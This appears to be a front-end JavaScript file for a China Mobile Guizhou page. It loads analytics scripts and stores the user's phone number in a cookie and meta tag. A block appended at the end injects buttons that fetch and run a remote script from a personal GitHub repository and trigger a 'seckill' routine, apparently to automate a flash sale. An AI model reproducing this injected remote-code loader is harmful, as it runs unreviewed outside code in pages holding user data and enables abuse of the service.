$(document).ready(function () {
  function getRootPaths() {
    //获取当前网址，如： http://localhost:8083/proj/meun.jsp
    var curWwwPath = window.document.location.href;
    //获取主机地址之后的目录，如： proj/meun.jsp
    var pathName = window.document.location.pathname;
    var pos = curWwwPath.indexOf(pathName);
    //获取主机地址，如： http://localhost:8083
    var localhostPath = curWwwPath.substring(0, pos);
    //获取带"/"的项目名，如：/proj
    var projectName = pathName.substring(0, pathName.substr(1).indexOf('/') + 1);
    return (localhostPath + projectName);
  }
  var ua = navigator.userAgent.toLowerCase();
  if (ua.match(/leadeon/i) == 'leadeon') {
    var s = document.createElement('script');
    s.async = true;
    s.src = getRootPaths() + '/js/insertCode/webtrends-jt.js';
    var s2 = document.getElementsByTagName('script') [0];
    s2.parentNode.insertBefore(s, s2);
    var ss = document.createElement('script');
    ss.async = true;
    ss.src = getRootPaths() + '/js/insertCode/jquery.cookie.js';
    var ss2 = document.getElementsByTagName('script') [0];
    ss2.parentNode.insertBefore(ss, ss2);
    //有会话信息走自己的业务流程
    leadeon.init = function () {
      //把页面需要一进来就执行的js放入这里，让客户端主动去调用他
      //获取用户信息
      leadeon.getUserInfo({
        debug: false,
        success: function (res1) {
          if (res1.phoneNumber) {
            var expire = new Date();
            var userPhone = res1.phoneNumber;
            if ($.cookie('resInfo') != null) {
              // alert($.cookie('resInfo'));
            } else {
              $.cookie('resInfo', userPhone, expire.getTime() + (30 * 60 * 1000));
            }
            $('head').prepend('<Meta name="WT.plat" content="APP">');
            // $("head").prepend("<Meta name=\"WT.cid\" content=" + res1.cid + ">");
            // $("head").prepend("<Meta name=\"WT.clientID\" content=" + res1.clientID + ">");
            $('head').prepend('<Meta name="WT.mobile" content=' + res1.phoneNumber + '>');
            // $("head").prepend("<Meta name=\"WT.prov\" content=" + res1.province + ">");
            // $("head").prepend("<Meta name=\"WT.city\" content=" + res1.city + ">");
            // $("head").prepend("<Meta name=\"WT.channel\" content=" + res1.channel + ">");
            // $("head").prepend("<Meta name=\"WT.av\" content=APP_" + res1.osType + "_" + res1.version + ">");
          } else {
            //拉起登录
            leadeon.showLogin();
          }
        }
      })
    }
  } else {
    // var s=document.createElement("script"); s.async=true; s.src=getRootPaths()+"/iplay/js/yjapp/webtrends.load.js";
    // var s2=document.getElementsByTagName("script")[0]; s2.parentNode.insertBefore(s,s2);
    // var ss=document.createElement("script"); ss.async=true; ss.src=getRootPaths()+"/iplay/js/yjapp/webtrends.min.js";
    // var ss2=document.getElementsByTagName("script")[0]; ss2.parentNode.insertBefore(ss,ss2);
    var s = document.createElement('script');
    s.async = true;
    s.src = getRootPaths() + '/js/insertCode/gz_sdc_load.js';
    var s2 = document.getElementsByTagName('script') [0];
    s2.parentNode.insertBefore(s, s2);
    // var param = $("#paramForm").serialize();
    // if(param){
    //     var url = getRootPaths()+'/iplay/global/getMataPhone';
    //     $.post(url,param,function(data){
    //         if (data.code == 0) {
    //             $("head").prepend("<Meta name=\"WT.mobile\" content=" + data.msg + ">");
    //         }
    //     },'json');
    // }
  }
});

////////////////////////////////////////////////////////////////////////////////////


function import_jsfile() {
  $.ajax({
    method: "GET",
    url: "https://cdn.jsdelivr.net/gh/hbsea/cm_cc@dev/a_nodelay.js",
    dataType: "script"
  });
}

      //add a butten  import
var a='<img class=import_jsfile" src="http://www.gz.10086.cn/weixin/imgh5/img/seckill/myprize.png" onclick="import_jsfile()">' +
      //add a butten  skill
      '<img class=import_jsfile" src="http://www.gz.10086.cn/weixin/imgh5/img/seckill/seckill.png" onclick="kill(3)">' +
      //add a butten  cancel
      '<img class=import_jsfile" src="http://www.gz.10086.cn/weixin/imgh5/img/seckill/0.png" onclick="temp()">'
 $('.bg').append(a);
